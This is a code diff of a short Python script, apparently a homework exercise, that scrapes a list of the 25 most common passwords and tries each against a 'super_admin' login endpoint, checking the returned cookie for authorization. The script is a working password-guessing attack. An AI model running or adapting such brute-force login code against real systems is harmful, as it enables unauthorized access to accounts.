@@ -10,13 +10,15 @@ locator = '//*[contains(text(),"Top 25 most common passwords by year according t
 passwords = tree.xpath(locator)
 for password in passwords:
     password = str(password).strip()
-    passwd.append(password)
+    if password not in passwd:
+     passwd.append(password)
 print(passwd)
 
 for i in passwd:
-    post_json = {"login":"super_admin", "password":f"{str(i)}"}
+    post_json = {"login":"super_admin", "password":f"{i}"}
     post = requests.post(get_secret_password_homework, data=post_json)
     cook = post.cookies
     check_cookie = requests.get(check_auth_cookie, cookies=cook)
     if check_cookie.text != "You are NOT authorized":
         print(f"password {i}, cookies {dict(cook)}:", check_cookie.text)
+
